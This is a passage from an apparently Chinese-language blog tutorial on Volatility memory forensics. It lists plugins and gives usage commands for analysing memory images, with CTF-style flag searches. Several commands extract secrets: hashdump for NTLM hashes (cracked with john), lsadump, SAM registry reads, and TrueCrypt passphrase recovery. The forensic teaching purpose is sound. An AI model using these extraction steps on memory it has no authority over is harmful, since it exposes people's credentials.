class="line">cmdline                    - 显示进程命令行参数</span><br><span class="line">cmdscan                    - 通过扫描 _COMMAND_HISTORY 来提取命令历史记录</span><br><span class="line">connections                - 打印打开的连接列表 [仅限 Windows XP 和 2003]</span><br><span class="line">connscan                   - 用于 tcp 连接的池扫描器</span><br><span class="line">consoles                   - 通过扫描 _CONSOLE_INFORMATION 提取命令历史记录</span><br><span class="line">crashinfo                  - 转储崩溃转储信息</span><br><span class="line">deskscan                   - tagDESKTOP（台式机）的 Poolscaner</span><br><span class="line">devicetree                 - 显示设备树</span><br><span class="line">dlldump                    - 从进程地址空间转储 DLL</span><br><span class="line">dlllist                    - 打印每个进程加载的 dll 列表</span><br><span class="line">driverirp                  - 驱动程序 IRP 挂钩检测</span><br><span class="line">drivermodule               - 将驱动程序对象关联到内核模块</span><br><span class="line">driverscan                 - 驱动程序对象的池扫描器</span><br><span class="line">dumpcerts                  - 转储 RSA 私有和公共 SSL 密钥</span><br><span class="line">dumpfiles                  - 提取内存映射和缓存文件</span><br><span class="line">dumpregistry               - 将注册表文件转储到磁盘</span><br><span class="line">editbox                    - 显示有关编辑控件的信息（列表框实验）</span><br><span class="line">envars                     - 显示进程环境变量</span><br><span class="line">eventhooks                 - 在 Windows 事件挂钩上打印详细信息</span><br><span class="line">evtlogs                    - 提取 Windows 事件日志（仅限 XP/2003）</span><br><span class="line">filescan                   - 文件对象的池扫描器</span><br><span class="line">gahti                      - 转储 USER 句柄类型信息</span><br><span class="line">gditimers                  - 打印已安装的 GDI 计时器和回调</span><br><span class="line">gdt                        - 显示全局描述符表</span><br><span class="line">getservicesids             - 获取 Registry 中的服务名称并返回计算的 SID</span><br><span class="line">getsids                    - 打印拥有每个进程的 SID</span><br><span class="line">handles                    - 打印每个进程的打开句柄列表</span><br><span class="line">hashdump                   - 从内存中转储密码哈希 (LM/NTLM)</span><br><span class="line">hibinfo                    - 转储休眠文件信息</span><br><span class="line">hivedump                   - 打印注册表</span><br><span class="line">hivelist                   - 打印注册表配置单元列表</span><br><span class="line">hivescan                   - 注册表配置单元的池扫描程序</span><br><span class="line">hpakextract                - 从 HPAK 文件中提取物理内存 </span><br><span class="line">hpakinfo                   - 有关 HPAK 文件的信息 </span><br><span class="line">idt                        - 显示中断描述符表 </span><br><span class="line">iehistory                  - 重建 Internet Explorer 缓存/历史 </span><br><span class="line">imagecopy                  - 将物理地址空间复制为原始 DD 映像</span><br><span class="line">imageinfo                  - 识别图像的信息 </span><br><span class="line">impscan                    - 扫描对导入函数的调用</span><br><span class="line">joblinks                   - 打印进程作业链接信息 </span><br><span class="line">kdbgscan                   - 搜索和转储潜在的 KDBG 值 </span><br><span class="line">kpcrscan                   - 搜索和转储潜在的 KPCR 值</span><br><span class="line">ldrmodules                 - 检测未链接的 DLL </span><br><span class="line">limeinfo                   - 转储 Lime 文件格式信息</span><br><span class="line">linux_apihooks             - 检查用户态 apihooks </span><br><span class="line">linux_arp                  - 打印 ARP 表 </span><br><span class="line">linux_aslr_shift           - 自动检测 Linux ASLR shift </span><br><span class="line">linux_banner               - 打印 Linux 横幅信息</span><br><span class="line">linux_bash                 - 从 bash 进程内存中恢复 bash 历史记录</span><br><span class="line">linux_bash_env             - 恢复进程的动态环境变量</span><br><span class="line">linux_bash_hash            - 从 bash 进程内存中恢复 bash 哈希表 </span><br><span class="line">linux_check_afinfo         - 验证网络协议的操作函数指针</span><br><span class="line">linux_check_creds          - 检查是否有进程共享凭证结构</span><br><span class="line">linux_check_evt_arm        - 检查异常向量表以查找系统调用表挂钩 </span><br><span class="line">linux_check_fop            - 检查 rootkit 修改的文件操作结构</span><br><span class="line">linux_check_idt            - 检查 IDT 是否已被更改</span><br><span class="line">linux_check_inline_kernel  - 检查内联内核挂钩</span><br><span class="line">linux_check_modules        - 将模块列表与 sysfs 信息进行比较（如果可用）</span><br><span class="line">linux_check_syscall        - 检查系统调用表是否已更改</span><br><span class="line">linux_check_syscall_arm    - 检查系统调用表是否已更改</span><br><span class="line">linux_check_tty            - 检查 tty 设备的钩子</span><br><span class="line">linux_cpuinfo              - 打印每个活动处理器的信息 </span><br><span class="line">linux_dentry_cache         - 从 dentry 缓存中收集文件 </span><br><span class="line">linux_dmesg                - 收集 dmesg 缓冲区</span><br><span class="line">linux_dump_map             - 将选定的内存映射写入磁盘</span><br><span class="line">linux_dynamic_env          - 恢复进程的动态环境变量</span><br><span class="line">linux_elfs                 - 在进程映射中查找 ELF 二进制文件 </span><br><span class="line">linux_enumerate_files      - 列出文件系统缓存引用的文件 </span><br><span class="line">linux_find_file            - 列出并从内存中恢复文件 </span><br><span class="line">linux_getcwd               - 列出每个进程的当前工作目录 </span><br><span class="line">linux_hidden_modules       - 雕刻内存以查找隐藏的内核模块 </span><br><span class="line">linux_ifconfig             - 收集活动接口 </span><br><span class="line">linux_info_regs            - 就像 GDB 中的“信息寄存器”。 它打印出所有</span><br><span class="line">linux_iomem                - 提供类似于 /proc/iomem 的输出</span><br><span class="line">linux_kernel_opened_files  - 列出从内核中打开的文件 </span><br><span class="line">linux_keyboard_notifiers   - 解析键盘通知器调用链 </span><br><span class="line">linux_ldrmodules           - 将 proc 映射的输出与 libdl 中的库列表进行比较</span><br><span class="line">linux_library_list         - 列出加载到进程中的库 </span><br><span class="line">linux_librarydump          - 将进程内存中的共享库转储到磁盘 </span><br><span class="line">linux_list_raw             - 列出具有混杂套接字的应用程序 </span><br><span class="line">linux_lsmod                - 收集加载的内核模块 </span><br><span class="line">linux_lsof                 - 列出文件描述符及其路径 </span><br><span class="line">linux_malfind              - 寻找可疑的进程映射 </span><br><span class="line">linux_memmap               - 转储 linux 任务的内存映射 </span><br><span class="line">linux_moddump              - 提取加载的内核模块 </span><br><span class="line">linux_mount                - 收集挂载的 fs/devices</span><br><span class="line">linux_mount_cache          - 从 kmem_cache收集挂载的 fs/devices</span><br><span class="line">linux_netfilter            - 列出 Netfilter 钩子</span><br><span class="line">linux_netscan              - 雕刻网络连接结构 </span><br><span class="line">linux_netstat              - 列出打开的套接字 </span><br><span class="line">linux_pidhashtable         - 通过 PID 哈希表枚举进程 </span><br><span class="line">linux_pkt_queues           - 将每个进程的数据包队列写入磁盘</span><br><span class="line">linux_plthook              - 扫描 ELF 二进制文件的 PLT 以获取非需要图像的挂钩</span><br><span class="line">linux_proc_maps            - 收集进程内存映射 </span><br><span class="line">linux_proc_maps_rb         - 通过映射红黑树为 linux 收集进程映射</span><br><span class="line">linux_procdump             - 将进程的可执行映像转储到磁盘 </span><br><span class="line">linux_process_hollow       - 检查进程空心的迹象 </span><br><span class="line">linux_psaux                - 收集进程以及完整的命令行和开始时间 </span><br><span class="line">linux_psenv                - 收集进程及其静态环境变量 </span><br><span class="line">linux_pslist               - 通过遍历 task_struct-&gt;task 列表来收集活动任务</span><br><span class="line">linux_pslist_cache         - 从 kmem_cache 收集任务</span><br><span class="line">linux_psscan               - 扫描进程的物理内存</span><br><span class="line">linux_pstree               - 显示进程之间的父/子关系</span><br><span class="line">linux_psxview              - 使用各种进程列表查找隐藏进程</span><br><span class="line">linux_recover_filesystem   - 从内存中恢复整个缓存文件系统</span><br><span class="line">linux_route_cache          - 从内存中恢复路由缓存 </span><br><span class="line">linux_sk_buff_cache        - 从 sk_buff kmem_cache 中恢复数据包</span><br><span class="line">linux_slabinfo             - 在运行的机器上模拟 /proc/slabinfo</span><br><span class="line">linux_strings              - 将物理偏移量与虚拟地址匹配（可能需要一段时间，非常冗长）</span><br><span class="line">linux_threads              - 打印进程的线程 </span><br><span class="line">linux_tmpfs                - 从内存中恢复 tmpfs 文件系统</span><br><span class="line">linux_truecrypt_passphrase - 恢复缓存的 Truecrypt 密码</span><br><span class="line">linux_vma_cache            - 从 vm_area_struct 缓存中收集 VMA </span><br><span class="line">linux_volshell             - 内存映像中的 Shell </span><br><span class="line">linux_yarascan             - Linux 内存映像中的 shell</span><br><span class="line">lsadump                    - 从注册表中转储（解密的）LSA 机密</span><br><span class="line">mac_adium                  - 列出 Adium 消息</span><br><span class="line">mac_apihooks               - 检查进程中的 API 挂钩</span><br><span class="line">mac_apihooks_kernel        - 检查系统调用和内核函数是否被挂钩 </span><br><span class="line">mac_arp                    - 打印 arp 表</span><br><span class="line">mac_bash                   - 从 bash 进程内存中恢复 bash 历史记录</span><br><span class="line">mac_bash_env               - 恢复 bash 的环境变量</span><br><span class="line">mac_bash_hash              - 从 bash 进程内存中恢复 bash 哈希表</span><br><span class="line">mac_calendar               - 从 Calendar.app 获取日历事件</span><br><span class="line">mac_check_fop              - 验证文件操作指针 </span><br><span class="line">mac_check_mig_table        - 列出内核 MIG 表中的整体</span><br><span class="line">mac_check_syscall_shadow   - 查找影子系统调用表 </span><br><span class="line">mac_check_syscalls         - 检查系统调用表条目是否被挂钩 </span><br><span class="line">mac_check_sysctl           - 检查未知的 sysctl 处理程序</span><br><span class="line">mac_check_trap_table       - 检查 mach 陷阱表条目是否被钩住</span><br><span class="line">mac_compressed_swap        - 打印 Mac OS X VM 压缩器统计数据并转储所有压缩页面</span><br><span class="line">mac_contacts               - 从 Contacts.app 获取联系人姓名 </span><br><span class="line">mac_dead_procs             - 打印终止/取消分配的进程</span><br><span class="line">mac_dead_sockets           - 打印终止/取消分配的网络套接字</span><br><span class="line">mac_dead_vnodes            - 列出释放的 vnode 结构</span><br><span class="line">mac_devfs                  - 列出文件缓存中的文件 </span><br><span class="line">mac_dmesg                  - 打印内核调试缓冲区 </span><br><span class="line">mac_dump_file              - 转储指定文件 </span><br><span class="line">mac_dump_maps              - 转储进程的内存范围，可选地包括压缩交换中的页面 </span><br><span class="line">mac_dyld_maps              - 从 dyld 数据结构中获取进程的内存映射</span><br><span class="line">mac_find_aslr_shift        - 查找 10.8+ 图像的 ASLR 移位值</span><br><span class="line">mac_get_profile            - 自动检测 Mac 配置文件</span><br><span class="line">mac_ifconfig               - 列出所有设备的网络接口信息 </span><br><span class="line">mac_interest_handlers      - 列出 IOKit 兴趣处理程序 </span><br><span class="line">mac_ip_filters             - 报告任何挂钩的 IP 过滤器</span><br><span class="line">mac_kernel_classes         - 列出内核中加载的 c++ 类</span><br><span class="line">mac_kevents                - 显示进程的父/子关系</span><br><span class="line">mac_keychaindump           - 恢复可能的钥匙串密钥。 使用chainbreaker打开相关的keychain文件</span><br><span class="line">mac_ldrmodules             - 将 proc 映射的输出与 libdl 中的库列表进行比较</span><br><span class="line">mac_librarydump            - 转储进程的可执行文件 </span><br><span class="line">mac_list_files             - 列出文件缓存中的文件 </span><br><span class="line">mac_list_kauth_listeners   - 列出 Kauth Scope 监听器 </span><br><span class="line">mac_list_kauth_scopes      - 列出 Kauth 范围及其状态</span><br><span class="line">mac_list_raw               - 列出具有混杂套接字的应用程序 </span><br><span class="line">mac_list_sessions          - 枚举会话 </span><br><span class="line">mac_list_zones             - 打印活动区域 </span><br><span class="line">mac_lsmod                  - 列出加载的内核模块 </span><br><span class="line">mac_lsmod_iokit            - 列出通过 IOkit 加载的内核模块</span><br><span class="line">mac_lsmod_kext_map         - 列出加载的内核模块 </span><br><span class="line">mac_lsof                   - 列出每个进程打开的文件 </span><br><span class="line">mac_machine_info           - 打印有关样本的机器信息 </span><br><span class="line">mac_malfind                - 寻找可疑的进程映射 </span><br><span class="line">mac_memdump                - 将可寻址内存页转储到文件中 </span><br><span class="line">mac_moddump                - 将指定的内核扩展写入磁盘 </span><br><span class="line">mac_mount                  - 打印挂载的设备信息 </span><br><span class="line">mac_netstat                - 列出每个进程的活动网络连接 </span><br><span class="line">mac_network_conns          - 列出来自内核网络结构的网络连接 </span><br><span class="line">mac_notesapp               - 查找 Notes 消息的内容</span><br><span class="line">mac_notifiers              - 检测将钩子添加到 I/O 工具包中的 rootkit（例如 LogKext）</span><br><span class="line">mac_orphan_threads         - 列出不映射回已知模块/进程的线程</span><br><span class="line">mac_pgrp_hash_table        - 遍历进程组哈希表 </span><br><span class="line">mac_pid_hash_table         - 遍历 pid 哈希表</span><br><span class="line">mac_print_boot_cmdline     - 打印内核启动参数 </span><br><span class="line">mac_proc_maps              - 获取进程的内存映射 </span><br><span class="line">mac_procdump               - 转储进程的可执行文件 </span><br><span class="line">mac_psaux                  - 在用户区打印带有参数的进程 (**argv)</span><br><span class="line">mac_psenv                  - 在用户空间打印带有环境的进程 (**envp)</span><br><span class="line">mac_pslist                 - 列出正在运行的进程 </span><br><span class="line">mac_pstree                 - 显示进程的父/子关系</span><br><span class="line">mac_psxview                - 使用各种进程列表查找隐藏进程 </span><br><span class="line">mac_recover_filesystem     - 恢复缓存的文件系统 </span><br><span class="line">mac_route                  - 打印路由表 </span><br><span class="line">mac_socket_filters         - 报告套接字过滤器 </span><br><span class="line">mac_strings                - 将物理偏移量与虚拟地址匹配（可能需要一段时间，非常冗长）</span><br><span class="line">mac_tasks                  - 列出活动任务 </span><br><span class="line">mac_threads                - 列出进程线程 </span><br><span class="line">mac_threads_simple         - 列出线程及其开始时间和优先级 </span><br><span class="line">mac_timers                 - 报告内核驱动程序设置的定时器 </span><br><span class="line">mac_trustedbsd             - 列出恶意的trustedbsd 策略</span><br><span class="line">mac_version                - 打印 Mac 版本</span><br><span class="line">mac_vfsevents              - 列出过滤文件系统事件的进程 </span><br><span class="line">mac_volshell               - 内存映像中的外壳 </span><br><span class="line">mac_yarascan               - 扫描内存中的 yara 签名 </span><br><span class="line">machoinfo                  - 转储 Mach-O 文件格式信息</span><br><span class="line">malfind                    - 查找隐藏和注入的代码 </span><br><span class="line">mbrparser                  - 扫描并解析潜在的主引导记录 (MBR)</span><br><span class="line">memdump                    - 转储进程的可寻址内存 </span><br><span class="line">memmap                     - 打印内存映射 </span><br><span class="line">messagehooks               - 列出桌面和线程窗口消息挂钩 </span><br><span class="line">mftparser                  - 扫描并解析潜在的 MFT 条目</span><br><span class="line">moddump                    - 将内核驱动程序转储到可执行文件示例 </span><br><span class="line">modscan                    - 内核模块的池扫描器 </span><br><span class="line">modules                    - 打印加载模块的列表 </span><br><span class="line">multiscan                  - 一次扫描各种对象 </span><br><span class="line">mutantscan                 - 互斥对象的池扫描器 </span><br><span class="line">netscan                    - 扫描 Vista（或更高版本）图像的连接和套接字 </span><br><span class="line">notepad                    - 列出当前显示的记事本文本 </span><br><span class="line">objtypescan                - 扫描 Windows 对象类型对象</span><br><span class="line">patcher                    - 基于页面扫描修补内存 </span><br><span class="line">poolpeek                   - 可配置的池扫描器插件 </span><br><span class="line">pooltracker                - 显示池标签使用的摘要 </span><br><span class="line">printkey                   - 打印注册表项及其子项和值 </span><br><span class="line">privs                      - 显示进程权限 </span><br><span class="line">procdump                   - 将进程转储到可执行文件示例 </span><br><span class="line">pslist                     - 按照 EPROCESS 列表打印所有正在运行的进程</span><br><span class="line">psscan                     - 进程对象的池扫描器 </span><br><span class="line">pstree                     - 将进程列表打印为树 </span><br><span class="line">psxview                    - 使用各种进程列表查找隐藏进程 </span><br><span class="line">qemuinfo                   - 转储 Qemu 信息</span><br><span class="line">raw2dmp                    - 将物理内存样本转换为 windbg 故障转储</span><br><span class="line">screenshot                 - 保存基于 GDI 窗口的伪截图</span><br><span class="line">servicediff                - 列出 Windows 服务（ala Plugx）</span><br><span class="line">sessions                   - 列出 _MM_SESSION_SPACE 的详细信息（用户登录会话）</span><br><span class="line">shellbags                  - 打印 ShellBags 信息</span><br><span class="line">shimcache                  - 解析应用程序兼容性 Shim Cache 注册表项</span><br><span class="line">shutdowntime               - 从注册表打印机器的 ShutdownTime</span><br><span class="line">sockets                    - 打印打开的套接字列表 </span><br><span class="line">sockscan                   - tcp 套接字对象的池扫描器</span><br><span class="line">ssdt                       - 显示 SSDT 条目</span><br><span class="line">strings                    - 将物理偏移量与虚拟地址匹配（可能需要一段时间，非常冗长）</span><br><span class="line">svcscan                    - 扫描 Windows 服务</span><br><span class="line">symlinkscan                - 符号链接对象的池扫描器 </span><br><span class="line">thrdscan                   - 线程对象的池扫描器 </span><br><span class="line">threads                    - 调查 _ETHREAD 和 _KTHREADs</span><br><span class="line">timeliner                  - 从内存中的各种工件创建时间线 </span><br><span class="line">timers                     - 打印内核定时器和相关的模块 DPC</span><br><span class="line">truecryptmaster            - 恢复 TrueCrypt 7.1a 主密钥</span><br><span class="line">truecryptpassphrase        - TrueCrypt 缓存密码短语查找器</span><br><span class="line">truecryptsummary           - TrueCrypt 总结</span><br><span class="line">unloadedmodules            - 打印已卸载模块的列表 </span><br><span class="line">userassist                 - 打印 userassist 注册表项和信息</span><br><span class="line">userhandles                - 转储 USER 句柄表</span><br><span class="line">vaddump                    - 将 vad 部分转储到文件中</span><br><span class="line">vadinfo                    - 转储 VAD 信息</span><br><span class="line">vadtree                    - 遍历 VAD 树并以树格式显示</span><br><span class="line">vadwalk                    - 走 VAD 树</span><br><span class="line">vboxinfo                   - 转储 virtualbox 信息 </span><br><span class="line">verinfo                    - 从 PE 图像中打印出版本信息</span><br><span class="line">vmwareinfo                 - 转储 VMware VMSS/VMSN 信息</span><br><span class="line">volshell                   - 内存映像中的 Shell</span><br><span class="line">win10cookie                - 查找 Windows 10 的 ObHeaderCookie 值 </span><br><span class="line">windows                    - 打印桌面窗口（详细信息）</span><br><span class="line">wintree                    - 打印Z顺序桌面Windows树</span><br><span class="line">wndscan                    - 用于窗口站的池扫描仪</span><br><span class="line">yarascan                   - 使用 Yara 签名扫描进程或内核内存</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Scanner Checks</span><br><span class="line">--------------</span><br><span class="line">CheckPoolSize          - 检查池块大小</span><br><span class="line">CheckPoolType          - 检查池类型</span><br><span class="line">KPCRScannerCheck       - 检查自引用指针以查找KPCR</span><br><span class="line">MultiPrefixFinderCheck - 每页检查多个字符串，在偏移处完成</span><br><span class="line">MultiStringFinderCheck - 每页检查多个字符串</span><br><span class="line">PoolTagCheck           - 此扫描程序检查池标记的出现</span><br></pre></td></tr></table></figure><h3 id="命令使用方法"><a href="#命令使用方法" class="headerlink" title="命令使用方法"></a>命令使用方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility -f [image] --profile=[profile] [plugin]</span><br><span class="line">volatility -f [对象] --profile=[操作系统] [插件参数]</span><br></pre></td></tr></table></figure><p>ps：需要注意的在下面的操作开启之前需要分析系统信息，</p><h4 id="镜像信息"><a href="#镜像信息" class="headerlink" title="镜像信息"></a>镜像信息</h4><p>命令imageinfo即可获取镜像信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Volatility -f xxx.vmem imageinfo</span><br></pre></td></tr></table></figure><p>在查到操作系统后如果不确定可以使用以下命令查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility -f xxx.vmem --profile= [操作系统] volshell</span><br><span class="line">#volshell       内存镜像中的shel</span><br></pre></td></tr></table></figure><p>如果能找到对应的系统类型，volshell会得到镜像中的shell信息，如果没有就进不去</p><p><strong>确定操作系统就可以利用插件去分析</strong></p><h4 id="banner"><a href="#banner" class="headerlink" title="banner"></a>banner</h4><p>查看镜像所使用的系统版本信息。版本信息为x.x.x-xx-generic 系统XXXX</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem banner</span><br></pre></td></tr></table></figure><h4 id="clipboard"><a href="#clipboard" class="headerlink" title="clipboard"></a>clipboard</h4><p>提取Windows剪贴板中的内容，查看剪贴板信息clipboard</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 clipboard</span><br></pre></td></tr></table></figure><h4 id="cmdline"><a href="#cmdline" class="headerlink" title="cmdline"></a>cmdline</h4><p>显示进程命令行参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 cmdline</span><br></pre></td></tr></table></figure><h4 id="cmdscan"><a href="#cmdscan" class="headerlink" title="cmdscan"></a>cmdscan</h4><p>提取执行的命令行历史记录（扫描<code>_COMMAND_HISTORY</code>信息），可用于查看终端记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 cmdscan</span><br></pre></td></tr></table></figure><h4 id="connections"><a href="#connections" class="headerlink" title="connections"></a>connections</h4><p>打印系统打开的网络连接(仅支持Windows XP 和2003)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 connections</span><br></pre></td></tr></table></figure><h4 id="connscan"><a href="#connscan" class="headerlink" title="connscan"></a>connscan</h4><p>打印TCP连接信息，查看网络连接connscan</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 connscan</span><br></pre></td></tr></table></figure><h4 id="consoles"><a href="#consoles" class="headerlink" title="consoles"></a>consoles</h4><p>提取执行的命令行历史记录（扫描<code>_CONSOLE_INFORMATION</code>信息）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 consoles</span><br></pre></td></tr></table></figure><h4 id="dlllist"><a href="#dlllist" class="headerlink" title="dlllist"></a>dlllist</h4><p>打印每个进程加载的动态链接库列表，列出某一进程加载的所有dll文件dlllist</p><p>列出某一进程加载的所有dll文件，需要指定进程-p [pid]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 dlllist -p 2588</span><br></pre></td></tr></table></figure><h4 id="dumpfiles"><a href="#dumpfiles" class="headerlink" title="dumpfiles"></a>dumpfiles</h4><p>提取内存中映射或缓存的文件，查看文件内容dumpfiles</p><p>需要指定偏移量-Q和输出目录-D，dumpfiles：导出某一文件(指定虚拟地址)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 dumpfiles -Q 0xxxxxxxx -D ./</span><br></pre></td></tr></table></figure><h4 id="editbox"><a href="#editbox" class="headerlink" title="editbox"></a>editbox</h4><p>查看Edit编辑控件信息，显示有关编辑控件（曾经编辑过的内容）的信息，查看内存中记事本的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 editbox</span><br></pre></td></tr></table></figure><h4 id="envars"><a href="#envars" class="headerlink" title="envars"></a>envars</h4><p>显示进程的环境变量，查看环境变量envars</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 envars</span><br></pre></td></tr></table></figure><h4 id="filescan"><a href="#filescan" class="headerlink" title="filescan"></a>filescan</h4><p>提取文件对象（file objects）池信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 filescan</span><br></pre></td></tr></table></figure><p>linux配合 grep 命令进行相关字符定向扫描，如：grep flag、grep -E ‘png|jpg|gif|zip|rar|7z|pdf|txt|doc’</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 filescan grep &quot;flag.txt&quot;</span><br><span class="line">cat system.txt|grep -i computername</span><br></pre></td></tr></table></figure><h4 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h4><p>转储内存中的Windows帐户密码哈希(LM/NTLM)，查看用户名密码信息(密码是哈希值，需要john爆破)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 hashdump</span><br></pre></td></tr></table></figure><p>查看当前操作系统中的password hash，例如Windows的SAM文件内容(mimikatz插件可以获取系统明文密码)</p><h4 id="hivedump"><a href="#hivedump" class="headerlink" title="hivedump"></a>hivedump</h4><p>打印注册表配置单元信息，查看注册表键名hivedmp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 hivedump -o 0xfffff8a001032410</span><br></pre></td></tr></table></figure><h4 id="hivelist"><a href="#hivelist" class="headerlink" title="hivelist"></a>hivelist</h4><p>打印注册表配置单元列表，查看注册表配置单元hivelist</p><p>列出所有的注册表项及其虚拟地址和物理地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 hivelist</span><br></pre></td></tr></table></figure><h4 id="iehistory"><a href="#iehistory" class="headerlink" title="iehistory"></a>iehistory</h4><p>重建IE缓存及访问历史记录，查看浏览器历史记录,获取当前系统浏览器搜索过的关键词</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 iehistory</span><br></pre></td></tr></table></figure><h4 id="imageinfo"><a href="#imageinfo" class="headerlink" title="imageinfo"></a>imageinfo</h4><p>查看/识别镜像信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Volatility -f xxx.vmem imageinfo</span><br></pre></td></tr></table></figure><h4 id="memdump"><a href="#memdump" class="headerlink" title="memdump"></a>memdump</h4><p>转储进程的可寻址内存，提取出指定进程，常用foremost 来分离里面的文件  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 memdump -p xxx --dump-dir=./</span><br></pre></td></tr></table></figure><p>需要指定进程-p [pid] 和输出目录 -D</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memdump -p 332 -D XX/   </span><br></pre></td></tr></table></figure><p>提取进程   -p 进程号 -D 当前输出路径（导出为332.dmp）</p><p>dump出来的进程文件，可以使用 foremost 来分离里面的文件，用 binwak -e 不推荐</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings -e l 2040.dmp | grep flag 查找flag</span><br></pre></td></tr></table></figure><h4 id="mftparser"><a href="#mftparser" class="headerlink" title="mftparser"></a>mftparser</h4><p>扫描并解析潜在的MFT条目，恢复被删除的文件mftparser，恢复被删除的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 mftparser</span><br></pre></td></tr></table></figure><h4 id="notepad"><a href="#notepad" class="headerlink" title="notepad"></a>notepad</h4><p>查看记事本当前显示的文本，查看当前展示的notepad内容 notepad</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 notepad</span><br></pre></td></tr></table></figure><p>ps：查看当前展示的 notepad 文本（–profile=winxp啥的低版本可以，win7的不行，可以尝试使用editbox）</p><h4 id="printkey"><a href="#printkey" class="headerlink" title="printkey"></a>printkey</h4><p>打印注册表项及其子项和值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem –profile=Win7SP1x64 printkey -K “SAM\Domains\Account\Users\Names”</span><br></pre></td></tr></table></figure><ul><li>查看注册表键值</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 printkey -K &quot;ControlSet001\Control\ComputerName\ComputerName&quot;</span><br></pre></td></tr></table></figure><ul><li>获取主机名</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 printkey -K &quot;ControlSet001\Control\ComputerName\ComputerName&quot;</span><br></pre></td></tr></table></figure><ul><li>列出用户名</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;</span><br></pre></td></tr></table></figure><h4 id="pslist"><a href="#pslist" class="headerlink" title="pslist"></a>pslist</h4><p>按照EPROCESS列表打印所有正在运行的进程</p><p><strong>pslist：该插件列举出系统进程，但它不能检测到隐藏或者解链的进程，psscan可以</strong></p><ul><li>查看进程</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 pslist</span><br></pre></td></tr></table></figure><ul><li>查看已知进程</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 